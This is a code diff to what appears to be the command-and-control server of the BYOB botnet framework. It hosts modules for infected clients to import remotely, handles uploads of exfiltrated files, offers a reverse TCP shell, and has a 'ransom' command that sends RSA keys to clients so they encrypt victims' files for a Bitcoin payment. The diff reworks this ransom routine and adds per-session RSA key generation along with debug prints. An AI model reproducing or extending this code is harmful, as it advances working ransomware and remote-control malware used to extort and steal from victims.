@@ -21,6 +21,7 @@ import subprocess
 import collections
 
 http_serv_mod = "SimpleHTTPServer"
+
 if sys.version_info[0] > 2:
     http_serv_mod = "http.server"
     sys.path.append('core')
@@ -132,13 +133,13 @@ def main():
     globals()['debug'] = options.debug
 
     # host Python packages on C2 port + 2 (for clients to remotely import)
-    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+    # globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
 
     # host BYOB modules on C2 port + 1 (for clients to remotely import)
     globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
 
     # run simple HTTP POST request handler on C2 port + 3 to handle incoming uploads of exfiltrated files
-    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
+    # globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
 
     # run C2
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
@@ -220,7 +221,7 @@ class C2():
                 'usage': 'shell <id>',
                 'description': 'interact with a client with a reverse TCP shell through an active session'},
             'ransom' : {
-                'method': self.session_ransom,
+                'method': 'you must first connect to a session to use this command', # self.session_ransom,
                 'usage': 'ransom [id]',
                 'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'},
             'webcam' : {
@@ -865,15 +866,25 @@ class C2():
         :param str args:    encrypt, decrypt, payment
 
         """
-        if self.current_session:
-            if 'decrypt' in str(args):
-                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.exportKey())})
-            elif 'encrypt' in str(args):
-                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())})
-            else:
-                self.current_session.send_task({"task": "ransom {}".format(args)})
-        else:
+        if not self.current_session:
             util.log("No client selected")
+            return "No client selected"
+
+        if 'decrypt' in str(args):
+            self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.exportKey())})
+        elif 'encrypt' in str(args):
+            print('line 875 task: ', "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey()))
+            self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())})
+            # pass
+        else:
+            self.current_session.send_task({"task": "ransom {}".format(args)})
+
+        task = self.current_session.recv_task()
+        result = task.get('result')
+        self.current_session._active.set()
+
+        return "Catching end case"
+
 
     def session_shell(self, session):
         """
@@ -1046,7 +1057,11 @@ class Session(threading.Thread):
         self.id = id
         self.connection = connection
         self.key = security.diffiehellman(self.connection)
-        self.rsa = None  # security.Crypto.PublicKey.RSA.generate(2048)
+        # self.rsa = security.Crypto.PublicKey.RSA.generate(2048)
+
+        from Crypto.PublicKey import RSA
+        self.rsa = RSA.generate(2048)
+
         try:
             self.info = self.client_info()
             #self.info['id'] = self.id
@@ -1171,19 +1186,36 @@ class Session(threading.Thread):
                                     task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                     globals()['c2'].display(result.encode())
                                     globals()['c2'].database.handle_task(task)
+                                else:
+                                    print('in failed case line 1182')
                                 continue
+                            else:
+                                print("Error 1195. Not callable function")
                         else:
                             task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
+                            # task = globals()['c2'].database.handle_task({'task': 'portscanner 127.0.0.1', 'session': self.info.get('uid')})
                             self.send_task(task)
                     elif 'result' in task:
                         if task.get('result') and task.get('result') != 'None':
                             globals()['c2'].display(task.get('result').encode())
                             globals()['c2'].database.handle_task(task)
+                        else:
+                            """
+
+                            THIS IS GOING TO BE A FAILURE CASE. CATCH
+                            THE BUG HERE
+
+                            """
+                            print(task)
+                    else:
+                        print("line 1207. Task doesn't have any categories in it")
                 else:
                     if self._abort:
                         break
                     elif isinstance(task, int) and task == 0:
                         break
+                    else:
+                        print("line 1211. Not abort and task isn't int")
                 self._prompt = None
 
         time.sleep(1)
